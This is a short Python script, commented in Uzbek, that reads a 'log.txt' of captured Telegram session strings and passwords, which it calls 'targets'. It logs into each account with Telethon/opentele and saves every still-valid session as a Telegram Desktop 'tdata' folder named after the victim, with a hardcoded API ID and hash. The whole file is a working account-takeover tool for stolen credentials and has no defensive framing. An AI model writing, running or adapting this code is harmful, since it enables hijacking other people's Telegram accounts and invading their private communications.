import asyncio
import os
import re
import logging
import warnings
from opentele.td import TDesktop
from opentele.tl import TelegramClient
from telethon.sessions import StringSession

# Barcha ogohlantirish va keraksiz loglarni o'chiramiz
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.getLogger('telethon').setLevel(logging.CRITICAL)

# --- KONFIGURATSIYA ---
API_ID = 33223639 
API_HASH = 'da4a254e086d07d78998b7992e64a39b'
LOG_FILE = "log.txt"

async def convert_all_sessions():
    if not os.path.exists(LOG_FILE):
        print(f"Xato: {LOG_FILE} topilmadi!")
        return

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_content = f.read()

    # Log faylini bloklarga bo'lish
    blocks = re.split(r"-{10,}", log_content)
    
    targets = []
    for block in blocks:
        session = re.search(r"SESSION: ([\w=-]+)", block)
        password = re.search(r"PASS: (\S+)", block)
        if session:
            targets.append({
                "session": session.group(1).strip(),
                "password": password.group(1).strip() if password else None
            })

    if not targets:
        print("Hech qanday sessiya ma'lumotlari topilmadi.")
        return

    print(f"Jami {len(targets)} ta nishon topildi. Tekshirish boshlanmoqda...\n")

    for index, target in enumerate(targets, start=1):
        print(f"[{index}] Sessiya tekshirilmoqda...")
        
        client = TelegramClient(StringSession(target["session"]), API_ID, API_HASH)
        
        try:
            await client.connect()
            
            if await client.is_user_authorized():
                user = await client.get_me()
                u_name = f"@{user.username}" if user.username else "yo'q"
                folder_name = f"tdata_{index}_{user.first_name}"
                
                # Yangi tdata yaratish
                td = await client.ToTDesktop(password=target["password"])
                
                # MUHIM: Yangi versiyalarda .SaveTData() ishlatiladi
                td.SaveTData(folder_name)
                
                print(f"✅ MUVAFFAQIYATLI: {user.first_name} ({u_name}) -> '{folder_name}' papkasi yaratildi.")
            else:
                print(f"❌ YAROQSIZ: Foydalanuvchi seansni tugatgan.")
                
        except Exception as e:
            print(f"⚠️ XATOLIK: {str(e)}")
        
        finally:
            await client.disconnect()
            print("-" * 45)

if __name__ == "__main__":
    asyncio.run(convert_all_sessions())